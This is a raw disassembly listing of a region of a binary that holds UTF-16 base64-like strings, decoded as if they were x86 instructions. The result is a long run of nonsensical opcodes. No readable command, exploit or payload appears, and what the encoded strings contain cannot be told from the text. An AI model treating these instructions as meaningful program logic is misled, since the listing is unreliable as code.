  40b0af:	78 00                	js     0x40b0b1
  40b0b1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b0b2:	00 78 00             	add    %bh,0x0(%eax)
  40b0b5:	4c                   	dec    %esp
  40b0b6:	00 5a 00             	add    %bl,0x0(%edx)
  40b0b9:	62 00                	bound  %eax,(%eax)
  40b0bb:	31 00                	xor    %eax,(%eax)
  40b0bd:	6d                   	insl   (%dx),%es:(%edi)
  40b0be:	00 50 00             	add    %dl,0x0(%eax)
  40b0c1:	78 00                	js     0x40b0c3
  40b0c3:	70 00                	jo     0x40b0c5
  40b0c5:	36 00 72 00          	add    %dh,%ss:0x0(%edx)
  40b0c9:	37                   	aaa
  40b0ca:	00 4e 00             	add    %cl,0x0(%esi)
  40b0cd:	61                   	popa
  40b0ce:	00 56 00             	add    %dl,0x0(%esi)
  40b0d1:	39 00                	cmp    %eax,(%eax)
  40b0d3:	49                   	dec    %ecx
  40b0d4:	00 6c 00 50          	add    %ch,0x50(%eax,%eax,1)
  40b0d8:	00 56 00             	add    %dl,0x0(%esi)
  40b0db:	2f                   	das
  40b0dc:	00 68 00             	add    %ch,0x0(%eax)
  40b0df:	52                   	push   %edx
  40b0e0:	00 4b 00             	add    %cl,0x0(%ebx)
  40b0e3:	7a 00                	jp     0x40b0e5
  40b0e5:	41                   	inc    %ecx
  40b0e6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b0e9:	6a 00                	push   $0x0
  40b0eb:	6c                   	insb   (%dx),%es:(%edi)
  40b0ec:	00 73 00             	add    %dh,0x0(%ebx)
  40b0ef:	59                   	pop    %ecx
  40b0f0:	00 7a 00             	add    %bh,0x0(%edx)
  40b0f3:	7a 00                	jp     0x40b0f5
  40b0f5:	59                   	pop    %ecx
  40b0f6:	00 37                	add    %dh,(%edi)
  40b0f8:	00 46 00             	add    %al,0x0(%esi)
  40b0fb:	6c                   	insb   (%dx),%es:(%edi)
  40b0fc:	00 72 00             	add    %dh,0x0(%edx)
  40b0ff:	4c                   	dec    %esp
  40b100:	00 5a 00             	add    %bl,0x0(%edx)
  40b103:	6c                   	insb   (%dx),%es:(%edi)
  40b104:	00 53 00             	add    %dl,0x0(%ebx)
  40b107:	31 00                	xor    %eax,(%eax)
  40b109:	39 00                	cmp    %eax,(%eax)
  40b10b:	71 00                	jno    0x40b10d
  40b10d:	2b 00                	sub    (%eax),%eax
  40b10f:	4c                   	dec    %esp
  40b110:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b113:	52                   	push   %edx
  40b114:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b117:	37                   	aaa
  40b118:	00 51 00             	add    %dl,0x0(%ecx)
  40b11b:	71 00                	jno    0x40b11d
  40b11d:	34 00                	xor    $0x0,%al
  40b11f:	39 00                	cmp    %eax,(%eax)
  40b121:	35 00 41 00 48       	xor    $0x48004100,%eax
  40b126:	00 70 00             	add    %dh,0x0(%eax)
  40b129:	46                   	inc    %esi
  40b12a:	00 39                	add    %bh,(%ecx)
  40b12c:	00 2b                	add    %ch,(%ebx)
  40b12e:	00 67 00             	add    %ah,0x0(%edi)
  40b131:	4e                   	dec    %esi
  40b132:	00 45 00             	add    %al,0x0(%ebp)
  40b135:	48                   	dec    %eax
  40b136:	00 6d 00             	add    %ch,0x0(%ebp)
  40b139:	79 00                	jns    0x40b13b
  40b13b:	33 00                	xor    (%eax),%eax
  40b13d:	72 00                	jb     0x40b13f
  40b13f:	57                   	push   %edi
  40b140:	00 43 00             	add    %al,0x0(%ebx)
  40b143:	61                   	popa
  40b144:	00 2b                	add    %ch,(%ebx)
  40b146:	00 6f 00             	add    %ch,0x0(%edi)
  40b149:	6c                   	insb   (%dx),%es:(%edi)
  40b14a:	00 6b 00             	add    %ch,0x0(%ebx)
  40b14d:	61                   	popa
  40b14e:	00 6c 00 6b          	add    %ch,0x6b(%eax,%eax,1)
  40b152:	00 4c 00 37          	add    %cl,0x37(%eax,%eax,1)
  40b156:	00 6b 00             	add    %ch,0x0(%ebx)
  40b159:	66 00 59 00          	data16 add %bl,0x0(%ecx)
  40b15d:	58                   	pop    %eax
  40b15e:	00 53 00             	add    %dl,0x0(%ebx)
  40b161:	30 00                	xor    %al,(%eax)
  40b163:	50                   	push   %eax
  40b164:	00 4e 00             	add    %cl,0x0(%esi)
  40b167:	79 00                	jns    0x40b169
  40b169:	35 00 72 00 67       	xor    $0x67007200,%eax
  40b16e:	00 6c 00 44          	add    %ch,0x44(%eax,%eax,1)
  40b172:	00 67 00             	add    %ah,0x0(%edi)
  40b175:	58                   	pop    %eax
  40b176:	00 2b                	add    %ch,(%ebx)
  40b178:	00 65 00             	add    %ah,0x0(%ebp)
  40b17b:	53                   	push   %ebx
  40b17c:	00 63 00             	add    %ah,0x0(%ebx)
  40b17f:	6b 00 47             	imul   $0x47,(%eax),%eax
  40b182:	00 73 00             	add    %dh,0x0(%ebx)
  40b185:	4b                   	dec    %ebx
  40b186:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40b18a:	00 4e 00             	add    %cl,0x0(%esi)
  40b18d:	37                   	aaa
  40b18e:	00 48 00             	add    %cl,0x0(%eax)
  40b191:	49                   	dec    %ecx
  40b192:	00 58 00             	add    %bl,0x0(%eax)
  40b195:	52                   	push   %edx
  40b196:	00 77 00             	add    %dh,0x0(%edi)
  40b199:	6e                   	outsb  %ds:(%esi),(%dx)
  40b19a:	00 49 00             	add    %cl,0x0(%ecx)
  40b19d:	36 00 66 00          	add    %ah,%ss:0x0(%esi)
  40b1a1:	6d                   	insl   (%dx),%es:(%edi)
  40b1a2:	00 43 00             	add    %al,0x0(%ebx)
  40b1a5:	31 00                	xor    %eax,(%eax)
  40b1a7:	34 00                	xor    $0x0,%al
  40b1a9:	34 00                	xor    $0x0,%al
  40b1ab:	57                   	push   %edi
  40b1ac:	00 58 00             	add    %bl,0x0(%eax)
  40b1af:	4b                   	dec    %ebx
  40b1b0:	00 66 00             	add    %ah,0x0(%esi)
  40b1b3:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1b4:	00 74 00 70          	add    %dh,0x70(%eax,%eax,1)
  40b1b8:	00 43 00             	add    %al,0x0(%ebx)
  40b1bb:	79 00                	jns    0x40b1bd
  40b1bd:	4a                   	dec    %edx
  40b1be:	00 44 00 50          	add    %al,0x50(%eax,%eax,1)
  40b1c2:	00 70 00             	add    %dh,0x0(%eax)
  40b1c5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1c6:	00 61 00             	add    %ah,0x0(%ecx)
  40b1c9:	70 00                	jo     0x40b1cb
  40b1cb:	6e                   	outsb  %ds:(%esi),(%dx)
  40b1cc:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1cf:	35 00 48 00 41       	xor    $0x41004800,%eax
  40b1d4:	00 51 00             	add    %dl,0x0(%ecx)
  40b1d7:	66 00 33             	data16 add %dh,(%ebx)
  40b1da:	00 61 00             	add    %ah,0x0(%ecx)
  40b1dd:	4f                   	dec    %edi
  40b1de:	00 2b                	add    %ch,(%ebx)
  40b1e0:	00 58 00             	add    %bl,0x0(%eax)
  40b1e3:	4f                   	dec    %edi
  40b1e4:	00 77 00             	add    %dh,0x0(%edi)
  40b1e7:	31 00                	xor    %eax,(%eax)
  40b1e9:	72 00                	jb     0x40b1eb
  40b1eb:	63 00                	arpl   %eax,(%eax)
  40b1ed:	47                   	inc    %edi
  40b1ee:	00 75 00             	add    %dh,0x0(%ebp)
  40b1f1:	4d                   	dec    %ebp
  40b1f2:	00 36                	add    %dh,(%esi)
  40b1f4:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1f7:	74 00                	je     0x40b1f9
  40b1f9:	6c                   	insb   (%dx),%es:(%edi)
  40b1fa:	00 69 00             	add    %ch,0x0(%ecx)
  40b1fd:	4a                   	dec    %edx
  40b1fe:	00 59 00             	add    %bl,0x0(%ecx)
  40b201:	4c                   	dec    %esp
  40b202:	00 73 00             	add    %dh,0x0(%ebx)
  40b205:	48                   	dec    %eax
  40b206:	00 6f 00             	add    %ch,0x0(%edi)
  40b209:	4a                   	dec    %edx
  40b20a:	00 51 00             	add    %dl,0x0(%ecx)
  40b20d:	55                   	push   %ebp
  40b20e:	00 75 00             	add    %dh,0x0(%ebp)
  40b211:	4c                   	dec    %esp
  40b212:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  40b216:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b219:	66 00 39             	data16 add %bh,(%ecx)
  40b21c:	00 66 00             	add    %ah,0x0(%esi)
  40b21f:	6b 00 4a             	imul   $0x4a,(%eax),%eax
  40b222:	00 50 00             	add    %dl,0x0(%eax)
  40b225:	31 00                	xor    %eax,(%eax)
  40b227:	30 00                	xor    %al,(%eax)
  40b229:	72 00                	jb     0x40b22b
  40b22b:	34 00                	xor    $0x0,%al
  40b22d:	67 00 2b             	add    %ch,(%bp,%di)
  40b230:	00 72 00             	add    %dh,0x0(%edx)
  40b233:	6e                   	outsb  %ds:(%esi),(%dx)
  40b234:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  40b238:	00 56 00             	add    %dl,0x0(%esi)
  40b23b:	50                   	push   %eax
  40b23c:	00 46 00             	add    %al,0x0(%esi)
  40b23f:	53                   	push   %ebx
  40b240:	00 76 00             	add    %dh,0x0(%esi)
  40b243:	6f                   	outsl  %ds:(%esi),(%dx)
  40b244:	00 32                	add    %dh,(%edx)
  40b246:	00 31                	add    %dh,(%ecx)
  40b248:	00 71 00             	add    %dh,0x0(%ecx)
  40b24b:	67 00 64 00          	add    %ah,0x0(%si)
  40b24f:	62 00                	bound  %eax,(%eax)
  40b251:	78 00                	js     0x40b253
  40b253:	31 00                	xor    %eax,(%eax)
  40b255:	35 00 2f 00 55       	xor    $0x55002f00,%eax
  40b25a:	00 78 00             	add    %bh,0x0(%eax)
  40b25d:	42                   	inc    %edx
  40b25e:	00 4c 00 65          	add    %cl,0x65(%eax,%eax,1)
  40b262:	00 2b                	add    %ch,(%ebx)
  40b264:	00 38                	add    %bh,(%eax)
  40b266:	00 56 00             	add    %dl,0x0(%esi)
  40b269:	45                   	inc    %ebp
  40b26a:	00 37                	add    %dh,(%edi)
  40b26c:	00 31                	add    %dh,(%ecx)
  40b26e:	00 30                	add    %dh,(%eax)
  40b270:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b273:	2f                   	das
  40b274:	00 48 00             	add    %cl,0x0(%eax)
  40b277:	52                   	push   %edx
  40b278:	00 36                	add    %dh,(%esi)
  40b27a:	00 77 00             	add    %dh,0x0(%edi)
  40b27d:	31 00                	xor    %eax,(%eax)
  40b27f:	54                   	push   %esp
  40b280:	00 70 00             	add    %dh,0x0(%eax)
  40b283:	45                   	inc    %ebp
  40b284:	00 37                	add    %dh,(%edi)
  40b286:	00 43 00             	add    %al,0x0(%ebx)
  40b289:	46                   	inc    %esi
  40b28a:	00 56 00             	add    %dl,0x0(%esi)
  40b28d:	49                   	dec    %ecx
  40b28e:	00 78 00             	add    %bh,0x0(%eax)
  40b291:	4c                   	dec    %esp
  40b292:	00 62 00             	add    %ah,0x0(%edx)
  40b295:	63 00                	arpl   %eax,(%eax)
  40b297:	47                   	inc    %edi
  40b298:	00 6b 00             	add    %ch,0x0(%ebx)
  40b29b:	61                   	popa
  40b29c:	00 59 00             	add    %bl,0x0(%ecx)
  40b29f:	4f                   	dec    %edi
  40b2a0:	00 73 00             	add    %dh,0x0(%ebx)
  40b2a3:	4c                   	dec    %esp
  40b2a4:	00 48 00             	add    %cl,0x0(%eax)
  40b2a7:	30 00                	xor    %al,(%eax)
  40b2a9:	52                   	push   %edx
  40b2aa:	00 4a 00             	add    %cl,0x0(%edx)
  40b2ad:	32 00                	xor    (%eax),%al
  40b2af:	39 00                	cmp    %eax,(%eax)
  40b2b1:	76 00                	jbe    0x40b2b3
  40b2b3:	50                   	push   %eax
  40b2b4:	00 76 00             	add    %dh,0x0(%esi)
  40b2b7:	66 00 4e 00          	data16 add %cl,0x0(%esi)
  40b2bb:	37                   	aaa
  40b2bc:	00 78 00             	add    %bh,0x0(%eax)
  40b2bf:	73 00                	jae    0x40b2c1
  40b2c1:	78 00                	js     0x40b2c3
  40b2c3:	66 00 33             	data16 add %dh,(%ebx)
  40b2c6:	00 67 00             	add    %ah,0x0(%edi)
  40b2c9:	2b 00                	sub    (%eax),%eax
  40b2cb:	4e                   	dec    %esi
  40b2cc:	00 35 00 49 00 54    	add    %dh,0x54004900
  40b2d2:	00 65 00             	add    %ah,0x0(%ebp)
  40b2d5:	35 00 64 00 59       	xor    $0x59006400,%eax
  40b2da:	00 54 00 4a          	add    %dl,0x4a(%eax,%eax,1)
  40b2de:	00 68 00             	add    %ch,0x0(%eax)
  40b2e1:	74 00                	je     0x40b2e3
  40b2e3:	31 00                	xor    %eax,(%eax)
  40b2e5:	7a 00                	jp     0x40b2e7
  40b2e7:	53                   	push   %ebx
  40b2e8:	00 75 00             	add    %dh,0x0(%ebp)
  40b2eb:	38 00                	cmp    %al,(%eax)
  40b2ed:	39 00                	cmp    %eax,(%eax)
  40b2ef:	36 00 56 00          	add    %dl,%ss:0x0(%esi)
  40b2f3:	47                   	inc    %edi
  40b2f4:	00 78 00             	add    %bh,0x0(%eax)
  40b2f7:	79 00                	jns    0x40b2f9
  40b2f9:	47                   	inc    %edi
  40b2fa:	00 4a 00             	add    %cl,0x0(%edx)
  40b2fd:	45                   	inc    %ebp
  40b2fe:	00 4c 00 55          	add    %cl,0x55(%eax,%eax,1)
  40b302:	00 6f 00             	add    %ch,0x0(%edi)
  40b305:	59                   	pop    %ecx
  40b306:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40b30a:	00 37                	add    %dh,(%edi)
  40b30c:	00 33                	add    %dh,(%ebx)
  40b30e:	00 72 00             	add    %dh,0x0(%edx)
  40b311:	34 00                	xor    $0x0,%al
  40b313:	4b                   	dec    %ebx
  40b314:	00 63 00             	add    %ah,0x0(%ebx)
  40b317:	6f                   	outsl  %ds:(%esi),(%dx)
  40b318:	00 4f 00             	add    %cl,0x0(%edi)
  40b31b:	4a                   	dec    %edx
  40b31c:	00 78 00             	add    %bh,0x0(%eax)
  40b31f:	2b 00                	sub    (%eax),%eax
  40b321:	68 00 43 00 70       	push   $0x70004300
  40b326:	00 42 00             	add    %al,0x0(%edx)
  40b329:	45                   	inc    %ebp
  40b32a:	00 58 00             	add    %bl,0x0(%eax)
  40b32d:	53                   	push   %ebx
  40b32e:	00 58 00             	add    %bl,0x0(%eax)
  40b331:	4c                   	dec    %esp
  40b332:	00 31                	add    %dh,(%ecx)
  40b334:	00 38                	add    %bh,(%eax)
  40b336:	00 56 00             	add    %dl,0x0(%esi)
  40b339:	50                   	push   %eax
  40b33a:	00 42 00             	add    %al,0x0(%edx)
  40b33d:	34 00                	xor    $0x0,%al
  40b33f:	31 00                	xor    %eax,(%eax)
  40b341:	57                   	push   %edi
  40b342:	00 6b 00             	add    %ch,0x0(%ebx)
  40b345:	53                   	push   %ebx
  40b346:	00 4d 00             	add    %cl,0x0(%ebp)
  40b349:	45                   	inc    %ebp
  40b34a:	00 38                	add    %bh,(%eax)
  40b34c:	00 39                	add    %bh,(%ecx)
  40b34e:	00 63 00             	add    %ah,0x0(%ebx)
  40b351:	6a 00                	push   $0x0
  40b353:	43                   	inc    %ebx
  40b354:	00 2b                	add    %ch,(%ebx)
  40b356:	00 36                	add    %dh,(%esi)
  40b358:	00 4f 00             	add    %cl,0x0(%edi)
  40b35b:	48                   	dec    %eax
  40b35c:	00 68 00             	add    %ch,0x0(%eax)
  40b35f:	4f                   	dec    %edi
  40b360:	00 35 00 4f 00 51    	add    %dh,0x51004f00
  40b366:	00 6f 00             	add    %ch,0x0(%edi)
  40b369:	62 00                	bound  %eax,(%eax)
  40b36b:	6d                   	insl   (%dx),%es:(%edi)
  40b36c:	00 56 00             	add    %dl,0x0(%esi)
  40b36f:	76 00                	jbe    0x40b371
  40b371:	67 00 65 00          	add    %ah,0x0(%di)
  40b375:	53                   	push   %ebx
  40b376:	00 67 00             	add    %ah,0x0(%edi)
  40b379:	61                   	popa
  40b37a:	00 45 00             	add    %al,0x0(%ebp)
  40b37d:	77 00                	ja     0x40b37f
  40b37f:	4d                   	dec    %ebp
  40b380:	00 62 00             	add    %ah,0x0(%edx)
  40b383:	30 00                	xor    %al,(%eax)
  40b385:	66 00 37             	data16 add %dh,(%edi)
  40b388:	00 52 00             	add    %dl,0x0(%edx)
  40b38b:	4b                   	dec    %ebx
  40b38c:	00 47 00             	add    %al,0x0(%edi)
  40b38f:	5a                   	pop    %edx
  40b390:	00 35 00 57 00 73    	add    %dh,0x73005700
  40b396:	00 70 00             	add    %dh,0x0(%eax)
  40b399:	68 00 42 00 72       	push   $0x72004200
  40b39e:	00 75 00             	add    %dh,0x0(%ebp)
  40b3a1:	64 00 71 00          	add    %dh,%fs:0x0(%ecx)
  40b3a5:	47                   	inc    %edi
  40b3a6:	00 70 00             	add    %dh,0x0(%eax)
  40b3a9:	46                   	inc    %esi
  40b3aa:	00 45 00             	add    %al,0x0(%ebp)
  40b3ad:	2b 00                	sub    (%eax),%eax
  40b3af:	2f                   	das
  40b3b0:	00 63 00             	add    %ah,0x0(%ebx)
  40b3b3:	54                   	push   %esp
  40b3b4:	00 64 00 43          	add    %ah,0x43(%eax,%eax,1)
  40b3b8:	00 46 00             	add    %al,0x0(%esi)
  40b3bb:	37                   	aaa
  40b3bc:	00 71 00             	add    %dh,0x0(%ecx)
  40b3bf:	4e                   	dec    %esi
  40b3c0:	00 56 00             	add    %dl,0x0(%esi)
  40b3c3:	61                   	popa
  40b3c4:	00 6e 00             	add    %ch,0x0(%esi)
  40b3c7:	32 00                	xor    (%eax),%al
  40b3c9:	32 00                	xor    (%eax),%al
  40b3cb:	54                   	push   %esp
  40b3cc:	00 6f 00             	add    %ch,0x0(%edi)
  40b3cf:	69 00 59 00 5a 00    	imul   $0x5a0059,(%eax),%eax
  40b3d5:	45                   	inc    %ebp
  40b3d6:	00 45 00             	add    %al,0x0(%ebp)
  40b3d9:	76 00                	jbe    0x40b3db
  40b3db:	56                   	push   %esi
  40b3dc:	00 77 00             	add    %dh,0x0(%edi)
  40b3df:	43                   	inc    %ebx
  40b3e0:	00 6c 00 2b          	add    %ch,0x2b(%eax,%eax,1)
  40b3e4:	00 42 00             	add    %al,0x0(%edx)
  40b3e7:	62 00                	bound  %eax,(%eax)
  40b3e9:	65 00 50 00          	add    %dl,%gs:0x0(%eax)
  40b3ed:	4e                   	dec    %esi
  40b3ee:	00 6d 00             	add    %ch,0x0(%ebp)
  40b3f1:	4b                   	dec    %ebx
  40b3f2:	00 31                	add    %dh,(%ecx)
  40b3f4:	00 66 00             	add    %ah,0x0(%esi)
  40b3f7:	45                   	inc    %ebp
  40b3f8:	00 48 00             	add    %cl,0x0(%eax)
  40b3fb:	2b 00                	sub    (%eax),%eax
  40b3fd:	63 00                	arpl   %eax,(%eax)
  40b3ff:	79 00                	jns    0x40b401
  40b401:	38 00                	cmp    %al,(%eax)
  40b403:	45                   	inc    %ebp
  40b404:	00 56 00             	add    %dl,0x0(%esi)
  40b407:	76 00                	jbe    0x40b409
  40b409:	4b                   	dec    %ebx
  40b40a:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b40e:	00 74 00 6d          	add    %dh,0x6d(%eax,%eax,1)
  40b412:	00 79 00             	add    %bh,0x0(%ecx)
  40b415:	69 00 51 00 2b 00    	imul   $0x2b0051,(%eax),%eax
  40b41b:	4a                   	dec    %edx
  40b41c:	00 57 00             	add    %dl,0x0(%edi)
  40b41f:	5a                   	pop    %edx
  40b420:	00 52 00             	add    %dl,0x0(%edx)
  40b423:	79 00                	jns    0x40b425
  40b425:	7a 00                	jp     0x40b427
  40b427:	48                   	dec    %eax
  40b428:	00 51 00             	add    %dl,0x0(%ecx)
  40b42b:	4c                   	dec    %esp
  40b42c:	00 46 00             	add    %al,0x0(%esi)
  40b42f:	37                   	aaa
  40b430:	00 2f                	add    %ch,(%edi)
  40b432:	00 35 00 77 00 47    	add    %dh,0x47007700
  40b438:	00 65 00             	add    %ah,0x0(%ebp)
  40b43b:	6a 00                	push   $0x0
  40b43d:	6a 00                	push   $0x0
  40b43f:	67 00 3d             	add    %bh,(%di)
  40b442:	00 3d 00 00 80 b1    	add    %bh,0xb1800000
  40b448:	75 00                	jne    0x40b44a
  40b44a:	78 00                	js     0x40b44c
  40b44c:	4e                   	dec    %esi
  40b44d:	00 76 00             	add    %dh,0x0(%esi)
  40b450:	32 00                	xor    (%eax),%al
  40b452:	32 00                	xor    (%eax),%al
  40b454:	32 00                	xor    (%eax),%al
  40b456:	38 00                	cmp    %al,(%eax)
  40b458:	57                   	push   %edi
  40b459:	00 35 00 77 00 4d    	add    %dh,0x4d007700
  40b45f:	00 71 00             	add    %dh,0x0(%ecx)
  40b462:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  40b465:	00 2f                	add    %ch,(%edi)
  40b467:	00 6d 00             	add    %ch,0x0(%ebp)
  40b46a:	67 00 34             	add    %dh,(%si)
  40b46d:	00 72 00             	add    %dh,0x0(%edx)
  40b470:	63 00                	arpl   %eax,(%eax)
  40b472:	4a                   	dec    %edx
  40b473:	00 72 00             	add    %dh,0x0(%edx)
  40b476:	73 00                	jae    0x40b478
  40b478:	77 00                	ja     0x40b47a
  40b47a:	51                   	push   %ecx
  40b47b:	00 4d 00             	add    %cl,0x0(%ebp)
  40b47e:	34 00                	xor    $0x0,%al
  40b480:	4c                   	dec    %esp
  40b481:	00 33                	add    %dh,(%ebx)
  40b483:	00 42 00             	add    %al,0x0(%edx)
  40b486:	6d                   	insl   (%dx),%es:(%edi)
  40b487:	00 63 00             	add    %ah,0x0(%ebx)
  40b48a:	39 00                	cmp    %eax,(%eax)
  40b48c:	48                   	dec    %eax
  40b48d:	00 6b 00             	add    %ch,0x0(%ebx)
  40b490:	4a                   	dec    %edx
  40b491:	00 77 00             	add    %dh,0x0(%edi)
  40b494:	48                   	dec    %eax
  40b495:	00 6b 00             	add    %ch,0x0(%ebx)
  40b498:	62 00                	bound  %eax,(%eax)
  40b49a:	76 00                	jbe    0x40b49c
  40b49c:	62 00                	bound  %eax,(%eax)
  40b49e:	64 00 4f 00          	add    %cl,%fs:0x0(%edi)
  40b4a2:	6d                   	insl   (%dx),%es:(%edi)
  40b4a3:	00 66 00             	add    %ah,0x0(%esi)
  40b4a6:	72 00                	jb     0x40b4a8
  40b4a8:	67 00 2b             	add    %ch,(%bp,%di)
  40b4ab:	00 4b 00             	add    %cl,0x0(%ebx)
  40b4ae:	42                   	inc    %edx
  40b4af:	00 70 00             	add    %dh,0x0(%eax)
  40b4b2:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40b4b6:	47                   	inc    %edi
  40b4b7:	00 46 00             	add    %al,0x0(%esi)
  40b4ba:	41                   	inc    %ecx
  40b4bb:	00 65 00             	add    %ah,0x0(%ebp)
  40b4be:	4c                   	dec    %esp
  40b4bf:	00 6e 00             	add    %ch,0x0(%esi)
  40b4c2:	43                   	inc    %ebx
  40b4c3:	00 6d 00             	add    %ch,0x0(%ebp)
  40b4c6:	4d                   	dec    %ebp
  40b4c7:	00 33                	add    %dh,(%ebx)
  40b4c9:	00 75 00             	add    %dh,0x0(%ebp)
  40b4cc:	75 00                	jne    0x40b4ce
  40b4ce:	31 00                	xor    %eax,(%eax)
  40b4d0:	46                   	inc    %esi
  40b4d1:	00 66 00             	add    %ah,0x0(%esi)
  40b4d4:	33 00                	xor    (%eax),%eax
  40b4d6:	55                   	push   %ebp
  40b4d7:	00 68 00             	add    %ch,0x0(%eax)
  40b4da:	79 00                	jns    0x40b4dc
  40b4dc:	37                   	aaa
  40b4dd:	00 38                	add    %bh,(%eax)
  40b4df:	00 37                	add    %dh,(%edi)
  40b4e1:	00 67 00             	add    %ah,0x0(%edi)
  40b4e4:	4f                   	dec    %edi
  40b4e5:	00 6a 00             	add    %ch,0x0(%edx)
  40b4e8:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40b4ec:	68 00 53 00 56       	push   $0x56005300
  40b4f1:	00 41 00             	add    %al,0x0(%ecx)
  40b4f4:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b4f9:	80 b1 64 00 6f 00 45 	xorb   $0x45,0x6f0064(%ecx)
  40b500:	00 45 00             	add    %al,0x0(%ebp)
  40b503:	4c                   	dec    %esp
  40b504:	00 79 00             	add    %bh,0x0(%ecx)
  40b507:	65 00 64 00 77       	add    %ah,%gs:0x77(%eax,%eax,1)
  40b50c:	00 64 00 62          	add    %ah,0x62(%eax,%eax,1)
  40b510:	00 31                	add    %dh,(%ecx)
  40b512:	00 49 00             	add    %cl,0x0(%ecx)
  40b515:	59                   	pop    %ecx
  40b516:	00 55 00             	add    %dl,0x0(%ebp)
  40b519:	57                   	push   %edi
  40b51a:	00 51 00             	add    %dl,0x0(%ecx)
  40b51d:	41                   	inc    %ecx
  40b51e:	00 70 00             	add    %dh,0x0(%eax)
  40b521:	2f                   	das
  40b522:	00 31                	add    %dh,(%ecx)
  40b524:	00 71 00             	add    %dh,0x0(%ecx)
  40b527:	79 00                	jns    0x40b529
  40b529:	75 00                	jne    0x40b52b
  40b52b:	4b                   	dec    %ebx
  40b52c:	00 75 00             	add    %dh,0x0(%ebp)
  40b52f:	43                   	inc    %ebx
  40b530:	00 31                	add    %dh,(%ecx)
  40b532:	00 78 00             	add    %bh,0x0(%eax)
  40b535:	70 00                	jo     0x40b537
  40b537:	77 00                	ja     0x40b539
  40b539:	71 00                	jno    0x40b53b
  40b53b:	4b                   	dec    %ebx
  40b53c:	00 4a 00             	add    %cl,0x0(%edx)
  40b53f:	4d                   	dec    %ebp
  40b540:	00 5a 00             	add    %bl,0x0(%edx)
  40b543:	6f                   	outsl  %ds:(%esi),(%dx)
  40b544:	00 49 00             	add    %cl,0x0(%ecx)
  40b547:	6a 00                	push   $0x0
  40b549:	4e                   	dec    %esi
  40b54a:	00 6e 00             	add    %ch,0x0(%esi)
  40b54d:	61                   	popa
  40b54e:	00 63 00             	add    %ah,0x0(%ebx)
  40b551:	34 00                	xor    $0x0,%al
  40b553:	69 00 31 00 35 00    	imul   $0x350031,(%eax),%eax
  40b559:	58                   	pop    %eax
  40b55a:	00 5a 00             	add    %bl,0x0(%edx)
  40b55d:	33 00                	xor    (%eax),%eax
  40b55f:	76 00                	jbe    0x40b561
  40b561:	79 00                	jns    0x40b563
  40b563:	75 00                	jne    0x40b565
  40b565:	2f                   	das
  40b566:	00 53 00             	add    %dl,0x0(%ebx)
  40b569:	4e                   	dec    %esi
  40b56a:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b56e:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40b572:	00 51 00             	add    %dl,0x0(%ecx)
  40b575:	49                   	dec    %ecx
  40b576:	00 48 00             	add    %cl,0x0(%eax)
  40b579:	33 00                	xor    (%eax),%eax
  40b57b:	43                   	inc    %ebx
  40b57c:	00 50 00             	add    %dl,0x0(%eax)
  40b57f:	58                   	pop    %eax
  40b580:	00 4a 00             	add    %cl,0x0(%edx)
  40b583:	58                   	pop    %eax
  40b584:	00 4f 00             	add    %cl,0x0(%edi)
  40b587:	41                   	inc    %ecx
  40b588:	00 2f                	add    %ch,(%edi)
  40b58a:	00 62 00             	add    %ah,0x0(%edx)
  40b58d:	75 00                	jne    0x40b58f
  40b58f:	62 00                	bound  %eax,(%eax)
  40b591:	72 00                	jb     0x40b593
  40b593:	54                   	push   %esp
  40b594:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40b598:	00 58 00             	add    %bl,0x0(%eax)
  40b59b:	6d                   	insl   (%dx),%es:(%edi)
  40b59c:	00 61 00             	add    %ah,0x0(%ecx)
  40b59f:	41                   	inc    %ecx
  40b5a0:	00 47 00             	add    %al,0x0(%edi)
  40b5a3:	2f                   	das
  40b5a4:	00 41 00             	add    %al,0x0(%ecx)
  40b5a7:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b5ac:	80 b1 6a 00 73 00 79 	xorb   $0x79,0x73006a(%ecx)
  40b5b3:	00 6f 00             	add    %ch,0x0(%edi)
  40b5b6:	42                   	inc    %edx
  40b5b7:	00 41 00             	add    %al,0x0(%ecx)
  40b5ba:	61                   	popa
  40b5bb:	00 76 00             	add    %dh,0x0(%esi)
  40b5be:	68 00 79 00 33       	push   $0x33007900
  40b5c3:	00 58 00             	add    %bl,0x0(%eax)
  40b5c6:	39 00                	cmp    %eax,(%eax)
  40b5c8:	33 00                	xor    (%eax),%eax
  40b5ca:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b5ce:	7a 00                	jp     0x40b5d0
  40b5d0:	63 00                	arpl   %eax,(%eax)
  40b5d2:	41                   	inc    %ecx
  40b5d3:	00 46 00             	add    %al,0x0(%esi)
  40b5d6:	6a 00                	push   $0x0
  40b5d8:	61                   	popa
  40b5d9:	00 2b                	add    %ch,(%ebx)
  40b5db:	00 41 00             	add    %al,0x0(%ecx)
  40b5de:	64 00 67 00          	add    %ah,%fs:0x0(%edi)
  40b5e2:	4c                   	dec    %esp
  40b5e3:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b5e7:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40b5eb:	00 73 00             	add    %dh,0x0(%ebx)
  40b5ee:	50                   	push   %eax
  40b5ef:	00 42 00             	add    %al,0x0(%edx)
  40b5f2:	52                   	push   %edx
  40b5f3:	00 36                	add    %dh,(%esi)
  40b5f5:	00 6d 00             	add    %ch,0x0(%ebp)
  40b5f8:	52                   	push   %edx
